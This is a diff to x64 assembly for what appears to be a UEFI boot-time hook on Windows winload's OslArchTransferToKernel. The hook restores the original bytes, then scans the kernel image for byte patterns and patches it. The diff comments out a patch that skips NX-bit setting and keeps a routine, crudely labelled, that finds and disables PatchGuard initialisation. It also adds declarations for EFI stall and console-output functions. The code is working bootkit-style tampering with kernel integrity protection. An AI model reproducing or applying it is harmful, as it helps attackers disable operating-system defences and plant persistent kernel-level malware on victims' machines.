@@ -34,6 +34,10 @@ OslArchTransferToKernelPatchLocation dq 0
 
 ; Original OslArchTransferToKernel address
 extern oOslArchTransferToKernel:dq
+; Winload functions
+extern EfiStall:dq
+extern EfiConOutOutputString:dq
+
 
 ; Kernel patch patterns
 extern sigNxSetBit:db
@@ -117,6 +121,10 @@ OslArchTransferToKernelHook PROC
 	mov rbp, rsp
 	and rsp, 0FFFFFFFFFFFFFFF0h ; align stack
 
+	;mov rcx, 10 * 1000000 ; stall 10 seconds
+	;mov rax, EfiStall
+	;call rax
+
 	; Before we do anything lets restore the original function bytes
 restore_bytes:
 	lea rsi, OslArchTransferToKernelBackup
@@ -137,21 +145,22 @@ get_imagesize:
 	mov ebx, dword ptr [rdx + rcx + 50h]	; get SizeOfImage from OptionialHeader in PE
 
 	; Skip setting the NX bit for when we want to set executable memory in kernel
-skip_nx_bit:
-	lea rcx, sigNxSetBit
-	sub rbx, sigNxSetBitSize
-	push rdx
-	mov rax, rdx
-	mov rdx, sigNxSetBitSize
-	call find_pattern
-	cmp rax, 0
-	je OslArchTransferToKernelHook_exit
-	mov byte ptr[rax], 0EBh ; Patch 'jz short' to 'jmp short'
+;skip_nx_bit:
+;	lea rcx, sigNxSetBit
+;	sub rbx, sigNxSetBitSize
+;	push rdx
+;	mov rax, rdx
+;	mov rdx, sigNxSetBitSize
+;	call find_pattern
+;	cmp rax, 0
+;	je OslArchTransferToKernelHook_exit
+;	mov byte ptr[rax], 0EBh ; Patch 'jz short' to 'jmp short'
 
 	; Get rid of patchguard
 fuck_you_patchguard:
 	lea rcx, sigInitPatchGuard
 	sub rbx, sigInitPatchGuardSize
+	push rdx
 	mov rax, rdx
 	mov rdx, sigInitPatchGuardSize
 	call find_pattern
